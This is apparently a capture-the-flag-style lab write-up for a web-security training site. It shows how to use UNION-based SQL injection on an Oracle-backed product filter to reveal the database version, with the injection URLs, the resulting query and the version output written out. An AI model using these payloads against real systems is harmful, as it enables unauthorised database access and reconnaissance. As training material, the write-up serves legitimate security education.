# Lab: SQL injection attack, querying the database type and version on Oracle
 This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

## Query the version of databases
| Database type    | Query                   |
| ---------------- | ----------------------- |
| Microsoft, MySQL | SELECT @@version        |
| Oracle           | SELECT * FROM v$version |
| PostgreSQL       | SELECT version()        |

## UNION attack with Oracle
Oracle is slightly different to other SQL implementations. Every `SELECT` statement must specify a table to select `FROM`. So to perform an UNION attack, we have to give another table.

There is a built-in table on Oracle called dual which you can use for this purpose. For example: `UNION SELECT 'abc' FROM dual`

## Solution
To determine the number of columns that is returned we use the following (enumerating the amount of `NULL`):
```
https://0a82003604225ada802adad0006d00d7.web-security-academy.net/filter?category=Gifts%27+union+select+null,null+from+dual+--+
```
Until we get no error anymore.

Next we must find a column with a string as datatype. Iterating through shows, that both columns contain text data:
```
https://0a82003604225ada802adad0006d00d7.web-security-academy.net/filter?category=Gifts%27+union+select+'ab','cd'+from+dual+--+
```

At last we use the following query to get the database version:
```
https://0a82003604225ada802adad0006d00d7.web-security-academy.net/filter?category=Gifts%27+union+select+null,banner+from+v$version+--+
```

This will create some kind of the following statement:
```sql
SELECT name, description FROM products WHERE category = 'Gifts' UNION SELECT NULL,banner FROM v$version -- 
```

As response we find the version of the Oracle database at the bottom of the content:
```
[...]

CORE 11.2.0.2.0 Production
NLSRTL Version 11.2.0.2.0 - Production
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
PL/SQL Release 11.2.0.2.0 - Production
TNS for Linux: Version 11.2.0.2.0 - Production
```

The challenge is solved.
